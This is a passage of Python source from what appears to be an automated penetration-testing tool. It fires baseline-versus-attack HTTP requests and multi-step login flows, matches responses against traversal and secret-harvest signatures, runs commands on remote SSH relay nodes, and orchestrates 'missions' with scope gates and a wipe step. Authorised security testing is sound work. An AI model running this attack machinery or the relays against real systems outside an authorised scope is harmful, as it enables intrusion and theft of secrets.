            c["fired"] = old.get("fired")
            c["at"] = old.get("at")
    fresh = [c for c in cards if (c["cls"], c.get("asset"), c["kind"]) not in seen]
    _atomic_write(camp / "hypothesis-state.json",
                  json.dumps({"generated": _now(), "target": args.target,
                              "kinds": list(kinds), "cards": cards[:200]},
                             indent=2))
    _event(args.target, "hypothesis",
           f"generated {len(cards)} cards ({len(fresh)} new · {blocked} scope-blocked)")

    if args.action == "brief":
        brief = out["brief"]
        if _json_mode(args):
            _emit(args, brief)
            return 0
        print(f"═══ HYPOTHESIS BRIEF — '{args.target}' · {brief['shown']}/{brief['count']} cards ═══")
        print("  the loop (the model reasons over this; the kernel executes it):")
        for step in brief["loop"]:
            print(f"    {step}")
        print("  rules:")
        for r in brief["rules"]:
            print(f"    · {r}")
        print()
        for c in brief["hypotheses"]:
            mark = "✓" if c.get("scope") == "ok" else "⛔"
            print(f"  {mark} {c['id']} [{c['kind']:7s}] {c['cls']:10s} "
                  f"score={c['score']:.2f}  {c['title'][:70]}")
            for w in c["why"]:
                print(f"      why: {w}")
            probe = c.get("probe") or {}
            if probe.get("attacks"):
                print(f"      probe: GET {probe.get('url')} param={probe.get('param')} "
                      f"attacks={probe['attacks'][:3]}")
            elif probe.get("payloads"):
                print(f"      probe payloads: {probe['payloads'][:3]}")
            elif probe.get("paths"):
                print(f"      probe paths: {probe['paths']}")
            if c.get("citations"):
                print(f"      citations: {', '.join(c['citations'])}")
        return 0

    payload = {"target": args.target, "kinds": list(kinds), "total": len(cards),
               "new": len(fresh), "scope_blocked": blocked,
               "cards": cards, "brief": out["brief"]}
    if _json_mode(args):
        _emit(args, payload)
        return 0
    print(f"═══ SPYDERMONKEY HYPOTHESIS ENGINE — {len(cards)} card(s) "
          f"({len(fresh)} new · {blocked} scope-blocked) ═══")
    for c in cards[:24]:
        mark = "✓" if c.get("scope") == "ok" else "⛔"
        print(f"  {mark} {c['id']} [{c['kind']:7s}] {c['cls']:10s} "
              f"score={c['score']:.2f}  {c['title'][:72]}")
        print(f"      why: {'; '.join(c['why'][:2])}")
    if len(cards) > 24:
        print(f"  … {len(cards) - 24} more (—json for all · hypothesis brief for the model document)")
    return 0


def _flow_http(steps, timeout=8):
    """Run a request SEQUENCE with cookie carryover (stdlib cookiejar opener)
    AND token carryover: a step may declare `save_as` (+ `save_from`:
    body|headers:<name>, `save_pattern`: regex with group 1) and later steps
    reference `{{name}}` in url/headers/body — substituted per-run. Returns the
    LAST step's response dict ({status, body, url}) — the same shape _http
    returns — so class verdicts and 3-gate semantics apply to multi-step flows
    (login → token → authed action). Fresh session per run."""
    import http.cookiejar as _cj
    import re as _re
    from urllib.request import Request, build_opener, HTTPCookieProcessor
    from urllib.error import HTTPError
    jar = _cj.CookieJar()
    opener = build_opener(HTTPCookieProcessor(jar))
    vars_ = {}

    def _sub(value):
        if not isinstance(value, str):
            return value
        for k, v in vars_.items():
            value = value.replace("{{" + k + "}}", v)
        return value

    last = None
    for st in steps:
        url = _sub(st["url"])
        method = st.get("method", "GET")
        body = _sub(st.get("body"))
        data = body.encode() if isinstance(body, str) else body
        headers = {k: _sub(v) for k, v in (st.get("headers") or {}).items()}
        req = Request(url, data=data, method=method)
        for k, v in headers.items():
            req.add_header(k, v)
        try:
            with opener.open(req, timeout=timeout) as r:
                last = {"status": r.status,
                        "body": r.read(200000).decode("utf-8", "replace"),
                        "url": url, "headers": dict(r.headers)}
        except HTTPError as e:
            last = {"status": e.code,
                    "body": e.read(200000).decode("utf-8", "replace"),
                    "url": url, "headers": dict(e.headers)}
        except Exception as e:
            last = {"status": 0, "body": f"error: {e}", "url": url,
                    "headers": {}}
        if st.get("save_as"):
            src, pat = st.get("save_from", "body"), st.get("save_pattern")
            if src == "body" and pat:
                m = _re.search(pat, last["body"])
                if m:
                    vars_[st["save_as"]] = m.group(1) if m.groups() else m.group(0)
            elif src.startswith("headers:") and pat:
                hv = last["headers"].get(src.split(":", 1)[1], "")
                m = _re.search(pat, hv)
                if m:
                    vars_[st["save_as"]] = m.group(1) if m.groups() else m.group(0)
    return last


def _hypothesis_request_pair(card: dict, ledger: list) -> tuple:
    """Build (baseline_kwargs, [(payload, attack_kwargs)]) from a card's probe.
    Returns (None, []) when the card is not auto-executable (chain plans and
    class-specific shapes). kwargs feed _http directly."""
    from urllib.parse import urlsplit, parse_qsl, urlencode, urlunsplit
    probe = card.get("probe") or {}
    cls = card.get("cls")

    if probe.get("flow") and probe.get("payloads"):
        # MULTI-STEP FLOW card: the steps carry a __PAYLOAD__ marker; the
        # baseline run substitutes it with `baseline`, each attack run with the
        # payload. The verdict diffs the FINAL step — logic chains (login →
        # action → result) become provable, not hypothetical.
        marker = probe.get("marker", "__PAYLOAD__")

        def _subst(steps, value):
            out = []
            for st in steps:
                s2 = {}
                for k, v in st.items():
                    if k == "headers" and isinstance(v, dict):
                        s2[k] = {hk: hv.replace(marker, value) if isinstance(hv, str) else hv
                                 for hk, hv in v.items()}
                    elif isinstance(v, str):
                        s2[k] = v.replace(marker, value)
                    else:
                        s2[k] = v
                out.append(s2)
            return out

        baseline_val = probe.get("baseline", "baseline")
        base = {"flow": _subst(probe["flow"], baseline_val)}
        attacks = [(p, {"flow": _subst(probe["flow"], p)}) for p in probe["payloads"]]
        return base, attacks

    if card.get("kind") == "surface" and cls == "CORS":
        base = probe.get("url") or card.get("asset")
        if not base:
            return None, []
        b = {"method": "GET", "url": base,
             "headers": {"Origin": "https://baseline.probe.invalid"}}
        a = {"method": "GET", "url": base,
             "headers": {"Origin": "https://cors.probe.invalid"}}
        return b, [("https://cors.probe.invalid", a)]

    if card.get("kind") == "surface" and probe.get("attacks") and probe.get("url"):
        base = probe["url"]
        param = probe.get("param")
        params = dict(parse_qsl(probe.get("baseline") or "",
                                keep_blank_values=True))
        baseline = base + ("?" + urlencode(params) if params else "")
        out = []
        for atk in probe["attacks"]:
            q = {k: v for k, v in params.items() if k != param}
            q[param] = atk
            out.append((atk, {"method": "GET",
                              "url": base + "?" + urlencode(q)}))
        return {"method": "GET", "url": baseline}, out

    if card.get("kind") == "surface" and probe.get("paths") and probe.get("control"):
        # path-probe card: baseline = the CONTROL path (must 404/unique), attacks
        # = each harvested path. The control keeps the 3-gate differential honest.
        b = (probe.get("base") or card.get("asset") or "").rstrip("/")
        if not b.startswith(("http://", "https://")):
            return None, []
        method = probe.get("method", "GET")
        base = {"method": method, "url": b + "/" + str(probe["control"]).lstrip("/")}
        attacks = [(p, {"method": method, "url": b + "/" + str(p).lstrip("/")})
                   for p in probe["paths"]]
        return base, attacks

    if card.get("kind") == "cve-map" and probe.get("paths"):
        # cve-map card: derive the origin from the ledger's first in-scope http
        # asset; baseline = the control path on that origin, attacks = the paths.
        paths = probe.get("paths") or ()
        origin = ""
        for r in ledger:
            a = r.get("asset") or ""
            if a.startswith(("http://", "https://")):
                sp = urlsplit(a)
                origin = f"{sp.scheme}://{sp.netloc}"
                break
        if not origin or not paths:
            return None, []
        base = {"method": "GET", "url": origin + "/__spydermonkey_control__"}
        attacks = [(p, {"method": "GET", "url": origin + "/" + str(p).lstrip("/")})
                   for p in paths]
        return base, attacks

    if card.get("kind") == "variant" and probe.get("payloads"):
        parent = next((r for r in ledger
                       if r.get("id") == card.get("parent")), None)
        asset = (parent or {}).get("asset") or card.get("asset") or ""
        if not asset.startswith(("http://", "https://")):
            return None, []
        sp = urlsplit(asset)
        pairs = parse_qsl(sp.query, keep_blank_values=True)
        if not pairs:
            return None, []
        p0 = pairs[0][0]
        base = urlunsplit((sp.scheme, sp.netloc, sp.path, "", ""))
        out = []
        for atk in probe["payloads"]:
            if atk == "__SHAPE_SUCCESSOR__":
                continue
            q = dict(pairs)
            q[p0] = atk
            out.append((atk, {"method": "GET",
                              "url": base + "?" + urlencode(q)}))
        return {"method": "GET", "url": asset}, out
    return None, []


# decisive body markers per class — the same evidence the batteries demand
HYP_SIGNATURES = {
    "TRAVERSAL": ("root:x:0:0", "root:*:0:0", "daemon:"),
    "NOSQL": ('"authenticated": true', '"role": "admin"', '"bypass": true'),
    "HARVEST": ("secret", "api_key", "password=", "ref: refs/",
                "BEGIN PRIVATE KEY", "DATABASE_URL"),
    "DIRECTORY": ("index of /", "<title>directory listing"),
    "AUTHN": ('"authenticated": true', '"bypass": true', '"role": "admin"'),
}


def cmd_hypothesis_run(args):
    """Execute ONE hypothesis card through the SAME 3-gate discipline the
    batteries use: baseline → attack → class verdict → ledger. Confirmed
    cards register CONFIRMED; non-decisive diffs register HYPOTHESIS;
    identical responses register NOTHING (never speculation)."""
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    hstate = _load_json(camp / "hypothesis-state.json", {"cards": []})
    cards = hstate.get("cards", [])
    if not cards:
        print("✗ no hypothesis cards — run `hypothesis gen --target "
              f"{args.target}` first", file=sys.stderr)
        return 2
    ledger = _ledger_load(args.target)
    card = None
    if getattr(args, "id", None):
        card = next((c for c in cards if c.get("id") == args.id), None)
        if card is None:
            print(f"✗ no card {args.id}", file=sys.stderr)
            return 2
    else:
        # the highest-scored card that is auto-executable and not yet fired
        for c in cards:
            if c.get("status") in ("confirmed", "hypothesis", "disproven"):
                continue
            b, atks = _hypothesis_request_pair(c, ledger)
            if b and atks:
                card = c
                break
        if card is None:
            print("✗ no auto-executable card left — every card was fired or "
                  "needs a class-specific runner (`hypothesis brief`)",
                  file=sys.stderr)
            return 2

    if card.get("scope") == "blocked":
        print(f"✗ card {card['id']} is scope-blocked — refusing", file=sys.stderr)
        return 2
    baseline, attacks = _hypothesis_request_pair(card, ledger)
    if not baseline or not attacks:
        print(f"✗ card {card['id']} is not auto-executable "
              f"({card['kind']} · {card['cls']}) — see `hypothesis brief`",
              file=sys.stderr)
        return 2
    # the wall: the baseline AND every attack url pass the live-fire gate
    for _p, akw in [(-1, baseline)] + list(attacks):
        urls = ([s.get("url", "") for s in akw["flow"]] if "flow" in akw
                else [akw["url"]])
        for u in urls:
            if not _scope_gate(u, quiet=True):
                print(f"✗ refusing — attack url outside the declared estate: "
                      f"{u}", file=sys.stderr)
                return 2

    timeout = getattr(args, "timeout", 8)
    t = {"name": card["cls"], "signatures": HYP_SIGNATURES.get(card["cls"], ())}
    confirmed = None
    hypothesis = None
    tried = 0
    if not _json_mode(args):
        print(f"═══ HYPOTHESIS RUN — {card['id']} [{card['kind']}] {card['cls']} "
              f"on {card.get('asset', '')[:60]} ═══")
        print(f"  why: {'; '.join(card.get('why', [])[:2])}")
    for payload, akw in attacks:
        if "flow" in baseline:
            b = _flow_http(baseline["flow"], timeout=timeout)
        else:
            b = _http(baseline["url"], method=baseline.get("method", "GET"),
                      headers=baseline.get("headers"), timeout=timeout)
        if "flow" in akw:
            a = _flow_http(akw["flow"], timeout=timeout)
        else:
            a = _http(akw["url"], method=akw.get("method", "GET"),
                      headers=akw.get("headers"), timeout=timeout)
        tried += 1
        hit, decisive, reason = _tester_verdict(t, str(payload), b, a)
        if not _json_mode(args):
            mark = "✓" if decisive else ("·" if hit else "—")
            print(f"  {mark} {str(payload)[:48]:48s} "
                  f"{b['status']}/{len(b['body'])}B → {a['status']}/{len(a['body'])}B  {reason}")
        if decisive:
            confirmed = {"payload": payload, "baseline": b, "attack": a,
                         "reason": reason}
            break
        if hit and hypothesis is None:
            hypothesis = {"payload": payload, "baseline": b, "attack": a,
                          "reason": reason}

    verdict = "disproven"
    finding_id = None
    if confirmed:
        proof = (f"baseline: {baseline['url'][:110]} → "
                 f"{confirmed['baseline']['status']} len={len(confirmed['baseline']['body'])}; "
                 f"attack: {confirmed['attack']['url'][:110]} → "
                 f"{confirmed['attack']['status']} len={len(confirmed['attack']['body'])}; "
                 f"diff: {confirmed['reason']}; "
                 f"hypothesis: {card['id']} ({card['kind']})")
        e = _cmd_ledger_internal(args.target, card["title"], card["cls"],
                                 confirmed["attack"]["url"],
                                 card.get("severity_guess", "medium"), proof)
        finding_id = e.get("id")
        verdict = "confirmed"
    elif hypothesis:
        proof = (f"baseline: {baseline['url'][:110]} → "
                 f"{hypothesis['baseline']['status']} len={len(hypothesis['baseline']['body'])}; "
                 f"attack: {hypothesis['attack']['url'][:110]} → "
                 f"{hypothesis['attack']['status']} len={len(hypothesis['attack']['body'])}; "
                 f"diff: {hypothesis['reason']}; "
                 f"hypothesis: {card['id']} ({card['kind']})")
        e = _cmd_ledger_internal(args.target, card["title"], card["cls"],
                                 hypothesis["attack"]["url"],
                                 card.get("severity_guess", "medium"), proof,
                                 force_hypothesis=True)
        finding_id = e.get("id")
        verdict = "hypothesis"

    # persist the card's outcome — the regeneration loop reads this
    for c in cards:
        if c.get("id") == card["id"]:
            c["status"] = verdict
            c["fired"] = tried
            c["finding"] = finding_id
            c["at"] = _now()
    hstate["cards"] = cards
    _atomic_write(camp / "hypothesis-state.json",
                  json.dumps(hstate, indent=2))
    payload = {"target": args.target, "card": card["id"], "kind": card["kind"],
               "cls": card["cls"], "verdict": verdict, "tried": tried,
               "finding": finding_id}
    if _json_mode(args):
        _emit(args, payload)
        return 0
    if verdict == "confirmed":
        print(f"  ✓ CONFIRMED — new finding {finding_id} registered in the ledger")
        print(f"  ▸ regenerate: spydermonkey hypothesis gen --target {args.target}")
    elif verdict == "hypothesis":
        print(f"  ⚠ HYPOTHESIS — differential not decisive; {finding_id} "
              f"registered at confidence 0.4 (never suppressed)")
    else:
        print("  ✗ DISPROVEN — responses identical on every attack; "
              "nothing registered (no speculation)")
    return 0


def _md_escape(value) -> str:
    return str(value if value is not None else "").replace("|", "\\|").replace("\n", " ")


def _report_data(target: str) -> dict:
    camp = _camp(target)
    _ensure_campaign(target)
    rows = _ledger_load(target)
    chains = _load_json(camp / "chain-state.json", {}).get("chains", [])
    kage = _load_json(camp / "kage-state.json", {})
    harvest = _load_json(camp / "harvest-state.json", {})
    scope = _load_scope()
    try:
        scope_summary = sa.summary(scope) if scope else None
    except Exception:
        scope_summary = None
    return {
        "schema": SCHEMA,
        "generator": f"SPYDERMONKEY {VERSION}",
        "target": target,
        "generated": _now(),
        "manifest": _manifest(target),
        "scope": scope_summary,
        "findings": rows,
        "stats": _ledger_stats(rows),
        "integrity": _ledger_integrity_details(target),
        "chains": chains,
        "phases": _phase_board(target),
        "detection_rules": kage.get("rules", []),
        "harvest": harvest.get("crown", []),
        "events": _load_events(target, 50),
    }


def _report_markdown(data: dict) -> str:
    rows, chains = data["findings"], data["chains"]
    stats = data["stats"]
    scope = data["scope"]
    conf = [r for r in rows if r.get("status") == "CONFIRMED"]
    manifest = data.get("manifest") or {}
    L = [f"# SPYDERMONKEY War Report — {data['target']}", "",
         f"_generated {data['generated']} · SPYDERMONKEY {VERSION} · "
         f"scope: {(scope or {}).get('engagement', 'none declared')}_", "",
         "## Authorization & scope", "",
         f"- engagement: **{(scope or {}).get('engagement', 'none declared')}**",
         f"- objective: {manifest.get('objective') or '—'}",
         f"- in-scope entries: {(scope or {}).get('in_scope', '—')} · "
         f"deny entries: {(scope or {}).get('out_of_scope', '—')}",
         f"- expires: {(scope or {}).get('expires') or 'no expiry'}",
         f"- rules: {(scope or {}).get('rules', {})}",
         "", "## Executive summary", "",
         f"- **{len(rows)}** finding(s) registered · **{len(conf)}** confirmed with 3-gate evidence",
         f"- severity mix: {', '.join(f'{k}={v}' for k, v in sorted(stats['by_severity'].items())) or '—'}",
         f"- risk score: **{stats['risk_score']}** · cvss avg {stats['cvss_avg']} · max {stats['cvss_max']}",
         f"- **{len(chains)}** chain candidate(s) — low findings combining into high-impact chains",
         f"- **{len(data['detection_rules'])}** detection rule(s) mirrored (kage)",
         f"- harvest crown rows: {len(data['harvest'])} (shukaku pricing)",
         f"- methodology: {sum(1 for p in data['phases'] if p['status'] == 'completed')}"
         f"/{len(data['phases'])} phases complete",
         ""]
    if rows:
        L += ["## Findings", "",
              "| id | severity | cvss | status | class | title | asset |",
              "|---|---|---|---|---|---|---|"]
        for r in rows:
            L.append(f"| {r.get('id')} | {r.get('severity')} | {r.get('cvss')} |"
                     f" {r.get('status')} | {r.get('cls')} | {_md_escape(r.get('title'))} |"
                     f" {_md_escape(r.get('asset'))} |")
        L.append("")
        for r in rows:
            L += [f"### {r.get('id')} — {r.get('title')}"
                  f" [{r.get('status')} · {r.get('severity')} · conf {r.get('confidence')}]",
                  f"- class: {r.get('cls')} · asset: {r.get('asset')}"
                  + (f" · CWE {r.get('cwe')}" if r.get("cwe") else "")
                  + (f" · WSTG {r.get('wstg')}" if r.get("wstg") else "")
                  + (f" · ATT&CK {r.get('attack')}" if r.get("attack") else ""),
                  f"- evidence quality: {r.get('evidence_quality', '—')}",
                  f"- proof: {str(r.get('proof', ''))[:1200]}", ""]
    if chains:
        L += ["## Attack chains", ""]
        for ch in chains:
            L.append(f"- **{ch.get('id')}** [{ch.get('pattern')}] {ch.get('severity')}"
                     f" (conf {ch.get('confidence')}): {' + '.join(ch.get('entry_ids', []))}"
                     f" → {ch.get('impact')}")
        L.append("")
    if data["detection_rules"]:
        L += ["## Detection coverage (kage)", ""]
        for rule in data["detection_rules"]:
            L.append(f"- {rule.get('id', '?')} — {rule.get('title', rule.get('name', 'rule'))}")
        L.append("")
    if data["harvest"]:
        L += ["## Harvest impact (shukaku)", ""]
        for h in data["harvest"]:
            L.append(f"- {h.get('class', '?')} @ {h.get('asset', '?')}")
        L.append("")
    L += ["## Phase coverage", ""]
    for p in data["phases"]:
        L.append(f"- {p['status']:11s} {p['id']} ({p['mandate']})")
    L += ["", "## Evidence integrity", "",
          f"- ledger rows: {data['integrity']['rows']} · signed:"
          f" {data['integrity']['signed']} · unsigned: {data['integrity']['unsigned']}",
          f"- integrity errors: {len(data['integrity']['errors'])}", ""]
    L += ["## Closeout", "",
          "- validation-only: every confirmed action is one decisive proof, reversible.",
          "- NO-GAIN: nothing of value was retained; no persistence was installed.",
          "- scope: every live probe was checked against the declaration at the top.",
          ""]
    return "\n".join(L) + "\n"


def cmd_report(args):
    data = _report_data(args.target)
    fmt = (getattr(args, "format", None) or "markdown").lower()
    if fmt in ("md", "markdown"):
        text = _report_markdown(data)
        ext = ".md"
    elif fmt == "json":
        text = json.dumps(data, indent=2, ensure_ascii=False) + "\n"
        ext = ".json"
    elif fmt == "sarif":
        text = json.dumps(_ledger_to_sarif(args.target, data["findings"]),
                          indent=2) + "\n"
        ext = ".sarif.json"
    else:
        raise UsageError(f"unknown report format: {fmt} (markdown|json|sarif)")
    out = args.output or str(_camp(args.target) / f"{args.target}-spydermonkey-report{ext}")
    if out == "-":
        print(text, end="")
        return 0
    _atomic_write(Path(out), text, mode=0o600)
    payload = {"target": args.target, "format": fmt, "output": str(Path(out).resolve()),
               "bytes": len(text.encode()), "findings": len(data["findings"]),
               "confirmed": sum(1 for r in data["findings"]
                                if r.get("status") == "CONFIRMED"),
               "chains": len(data["chains"]),
               "detection_rules": len(data["detection_rules"]),
               "stats": data["stats"]}
    if _json_mode(args):
        _emit(args, payload)
    else:
        print(f"▸ war report written: {out} ({fmt})")
        print(f"  {payload['findings']} finding(s) · {payload['confirmed']} confirmed"
              f" · {payload['chains']} chain(s)"
              f" · {payload['detection_rules']} detection rule(s)")
    return 0


# ── 3.8 relay — remote execution nodes (Bolt-equivalent, Ed25519, scope-gated) ─

def _relay_dir() -> Path:
    return _root() / "relays"


def cmd_relay(args):
    action = args.action
    scope_file = getattr(args, "scope_file", None)
    if action == "init":
        if not shutil.which("ssh-keygen"):
            print("✗ ssh-keygen not found — relay nodes need OpenSSH", file=sys.stderr)
            return 1
        try:
            name = sa.safe_name(args.name, "relay name")
        except sa.ScopeError as e:
            raise UsageError(str(e)) from e
        d = _relay_dir() / name
        d.mkdir(parents=True, exist_ok=True)
        key = d / "ed25519.key"
        if not key.exists():
            r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", str(key), "-N", "",
                                "-C", f"spydermonkey-relay-{name}"],
                               capture_output=True, text=True)
            if r.returncode != 0:
                print(f"✗ ssh-keygen failed: {r.stderr.strip()[:120]}", file=sys.stderr)
                return 1
        try:
            os.chmod(key, 0o600)
        except OSError:
            pass
        _atomic_write(d / "relay.json", json.dumps(
            {"name": name, "host": args.host, "key": str(key),
             "added": _now()}) + "\n", mode=0o600)
        payload = {"name": name, "host": args.host, "key": str(key),
                   "public_key": str(key) + ".pub",
                   "pair": f"ssh-copy-id -i {key}.pub {args.host}",
                   "prove": f"spydermonkey relay exec --name {name} --cmd 'echo paired'"}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ RELAY NODE '{name}' — {args.host} ═══")
            print(f"  keypair: {key} (Ed25519)")
            print("  install the public key on the node, one line:")
            print(f"    {payload['pair']}")
            print(f"  then prove it: {payload['prove']}")
            print("  every exec scope-checks the host + every host-like token in the command")
        return 0
    if action == "list":
        rows = []
        if _relay_dir().exists():
            for f in sorted(_relay_dir().glob("*/relay.json")):
                r = _load_json(f, {})
                if r:
                    rows.append({"name": r.get("name"), "host": r.get("host"),
                                 "key": r.get("key"), "added": r.get("added"),
                                 "key_present": Path(r.get("key", "")).exists()})
        payload = {"nodes": rows, "count": len(rows)}
        if _json_mode(args):
            _emit(args, payload)
        elif not rows:
            print("· no relays — relay init --name N --host user@host")
        else:
            print("═══ RELAY NODES ═══")
            for r in rows:
                print(f"  ▸ {str(r['name']):12s} {str(r['host'])[:44]}"
                      f"  key {r['key']}{'' if r['key_present'] else ' (MISSING)'}")
        return 0
    if action == "remove":
        try:
            name = sa.safe_name(args.name, "relay name")
        except sa.ScopeError as e:
            raise UsageError(str(e)) from e
        d = _relay_dir() / name
        if not d.exists():
            print(f"✗ no relay '{args.name}'", file=sys.stderr)
            return 2
        shutil.rmtree(d)
        if _json_mode(args):
            _emit(args, {"name": name, "removed": True})
        else:
            print(f"▸ relay '{args.name}' removed")
        return 0
    if action == "exec":
        try:
            name = sa.safe_name(args.name, "relay name")
        except sa.ScopeError as e:
            raise UsageError(str(e)) from e
        r = _load_json(_relay_dir() / name / "relay.json", {})
        if not r:
            print(f"✗ no relay '{args.name}' — relay init first", file=sys.stderr)
            return 2
        host = r["host"].split("@")[-1].split(":")[0]
        tokens = [host] + re.findall(
            r"\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b|\b\d{1,3}(?:\.\d{1,3}){3}\b",
            args.relay_cmd.lower())
        for tok in dict.fromkeys(tokens):
            ok, reason, _ = sa.check(tok, file=scope_file, strict=True,
                                     audit=True, allow_lab=True)
            if not ok:
                print(f"✗ RELAY REFUSED — '{tok}' is outside the declared estate: {reason}",
                      file=sys.stderr)
                return 1
        key = r["key"]
        argv = ["ssh", "-i", key, "-o", "BatchMode=yes",
                "-o", "StrictHostKeyChecking=accept-new", r["host"], "--", args.relay_cmd]
        payload = {"name": name, "host": r["host"], "command": args.relay_cmd,
                   "argv": argv, "dry_run": bool(getattr(args, "dry_run", False))}
        if getattr(args, "dry_run", False):
            if _json_mode(args):
                _emit(args, payload)
            else:
                print(f"═══ RELAY EXEC (dry-run) — {name} ({r['host']}) ═══")
                print("  " + " ".join(argv))
            return 0
        if not _json_mode(args):
            print(f"═══ RELAY EXEC — {name} ({r['host']}) ═══")
            print(f"  ▸ {args.relay_cmd[:100]}")
        try:
            started = time.time()
            rc = subprocess.run(argv, timeout=max(1, int(args.timeout or 120))).returncode
        except subprocess.TimeoutExpired:
            if _json_mode(args):
                _emit(args, {**payload, "ok": False, "error": "timeout"})
            else:
                print("✗ relay timed out", file=sys.stderr)
            return 1
        payload.update({"ok": rc == 0, "rc": rc,
                        "elapsed": round(time.time() - started, 2)})
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ relay exit {rc} ═══")
        return rc
    return 2


# ── 3.9 mission — one command, the whole war + the intelligence layer ─────────

def _mission_steps(target: str) -> list[dict]:
    report = _camp(target) / f"{target}-spydermonkey-report.md"
    return [
        {"name": "triage", "argv": ["ledger", "triage", "--target", target]},
        {"name": "chains", "argv": ["chain", "detect", "--target", target]},
        {"name": "coverage", "argv": ["coverage", "--target", target]},
        {"name": "report", "argv": ["report", "--target", target, "--format",
                                    "markdown", "--output", str(report)],
         "artifact": str(report)},
    ]


def cmd_mission(args):
    target = args.target
    _camp(target)
    _ensure_campaign(target, url=args.url, domain=args.domain,
                     objective=args.goal or f"mission on {target}")
    plan_only = bool(getattr(args, "plan", False) or getattr(args, "dry_run", False))
    json_mode = _json_mode(args)
    scope_file = getattr(args, "scope_file", None)
    verdicts = []
    for value in (args.url, args.domain):
        ok, reason, scope = sa.check(value, file=scope_file, strict=True,
                                     audit=True, allow_lab=True)
        verdicts.append({"value": value, "in_scope": ok, "reason": reason,
                         "engagement": (scope or {}).get("engagement")})
        if not ok:
            if json_mode:
                _emit(args, {"target": target, "ok": False, "scope": verdicts,
                             "error": f"scope refusal: {value} — {reason}"})
            else:
                print(f"✗ MISSION REFUSED — {value}: {reason}", file=sys.stderr)
                print("  scope init --engagement E --in-scope <host> ; then re-run",
                      file=sys.stderr)
            return 1
    goal = args.goal or f"full assault on {target}"
    fleet_argv = ["fleet", "--goal", goal, "--target", target,
                  "--domain", args.domain]
    steps = _mission_steps(target)
    if plan_only:
        fleet_plan = []
        if not args.skip_fleet:
            rc, out, err = _run([sys.executable, str(Path(__file__).resolve())]
                                + fleet_argv + ["--dry-run", "--json"], timeout=30)
            try:
                fleet_plan = json.loads(out).get("plan", [])
            except Exception:
                fleet_plan = [{"error": (out or err)[:300]}]
        payload = {"target": target, "ok": True, "plan": True,
                   "scope": verdicts, "fleet": fleet_plan,
                   "steps": [{"name": s["name"],
                              "command": "spydermonkey " + " ".join(s["argv"])}
                             for s in steps],
                   "close": bool(args.close)}
        if json_mode:
            _emit(args, payload)
        else:
            print(f"═══ SPYDERMONKEY MISSION PLAN — {target} (nothing executes) ═══")
            for v in verdicts:
                print(f"  scope: {'✓' if v['in_scope'] else '✗'} {v['value']} ({v['reason']})")
            print(f"  fleet: {len(fleet_plan)} agent(s)" + (" (skipped)" if args.skip_fleet else ""))
            for p in fleet_plan:
                print(f"    ▸ {p.get('agent', '?')} — {p.get('command', p.get('error', ''))[:100]}")
            for s in payload["steps"]:
                print(f"  step {s['name']:10s} {s['command']}")
        return 0
    state_path = _camp(target) / "mission-state.json"
    state = _load_json(state_path, {"target": target, "steps": {}})
    if not getattr(args, "resume", False):
        state = {"target": target, "started": _now(), "steps": {}}
    else:
        state.setdefault("steps", {})
    results = {}
    rc = 0
    if not json_mode:
        print("═══ SPYDERMONKEY MISSION — scope gate → fleet → triage → chains → coverage → report ═══")
        for v in verdicts:
            print(f"  scope ✓ {v['value']}")

    def run_step(name, argv, timeout=180):
        nonlocal rc
        if getattr(args, "resume", False) and state["steps"].get(name, {}).get("ok"):
            results[name] = {**state["steps"][name], "skipped": True}
            if not json_mode:
                print(f"  · {name}: already complete (resume)")
            return results[name]
        r = subprocess.run([sys.executable, str(Path(__file__).resolve())]
                           + argv + ["--json"], capture_output=True, text=True,
                           timeout=timeout)
        try:
            payload = json.loads(r.stdout)
        except Exception:
            payload = {"raw": (r.stdout or r.stderr)[:800]}
        ok = r.returncode in (0, 1) if name == "triage" else r.returncode == 0
        blocker = name == "triage" and r.returncode == 1
        row = {"name": name, "rc": r.returncode, "ok": ok,
               "blocker": blocker, "at": _now(),
               "summary": _mission_summary(name, payload)}
        results[name] = row
        state["steps"][name] = row
        state["updated"] = _now()
        _atomic_write(state_path, json.dumps(state, indent=2) + "\n", mode=0o600)
        if blocker or not ok:
            rc = 1
        if not json_mode:
            mark = "⚠" if blocker else ("✓" if ok else "✗")
            print(f"  {mark} {name}: {row['summary']}")
        return row

    if not args.skip_fleet:
        if getattr(args, "resume", False) and state["steps"].get("fleet", {}).get("ok"):
            results["fleet"] = {**state["steps"]["fleet"], "skipped": True}
            if not json_mode:
                print("  · fleet: already complete (resume)")
        else:
            try:
                r = subprocess.run([sys.executable, str(Path(__file__).resolve())]
                                   + fleet_argv + ["--json"], capture_output=True,
                                   text=True, timeout=max(60, int(getattr(args, "timeout", 300))))
                fp = json.loads(r.stdout)
            except Exception as e:
                fp = {"up": 0, "total": 0, "error": str(e)[:300]}
            row = {"name": "fleet", "rc": 0 if fp.get("up") else 1,
                   "ok": bool(fp.get("up")), "at": _now(),
                   "summary": f"{fp.get('up', 0)}/{fp.get('total', 0)} agents up"}
            results["fleet"] = row
            state["steps"]["fleet"] = row
            _atomic_write(state_path, json.dumps(state, indent=2) + "\n", mode=0o600)
            if not json_mode:
                print(f"  {'✓' if row['ok'] else '⚠'} fleet: {row['summary']}")
    else:
        results["fleet"] = {"name": "fleet", "ok": True, "skipped": True,
                            "summary": "skipped (--skip-fleet)"}
    for step in steps:
        run_step(step["name"], step["argv"])
    if args.close:
        bc = FAMILY["barbican"][0]
        if bc.exists():
            r = subprocess.run([sys.executable, str(bc), "wipe", "--target", target],
                               capture_output=True, text=True)
            results["wipe"] = {"name": "wipe", "rc": r.returncode,
                               "ok": r.returncode == 0, "at": _now(),
                               "summary": (r.stdout or r.stderr).strip()[:200]}
            if not json_mode:
                print("  ✓ barbican wipe requested")
        m = _manifest(target)
        m["status"] = "closed"
        m["closed"] = _now()
        _save_manifest(target, m)
        _event(target, "mission.close", "mission --close")
    state["finished"] = _now()
    state["ok"] = rc == 0
    _atomic_write(state_path, json.dumps(state, indent=2) + "\n", mode=0o600)
    report = next((s.get("artifact") for s in steps if s["name"] == "report"),
                  str(_camp(target) / f"{target}-spydermonkey-report.md"))
    payload = {"target": target, "ok": rc == 0, "scope": verdicts,
               "fleet": results.get("fleet"), "steps": results,
               "state": str(state_path), "report": report,
               "close": bool(args.close), "resume": bool(args.resume)}
    if json_mode:
        _emit(args, payload)
    else:
        print(f"═══ MISSION {'COMPLETE' if rc == 0 else 'COMPLETE WITH BLOCKERS (rc=1)'} —"
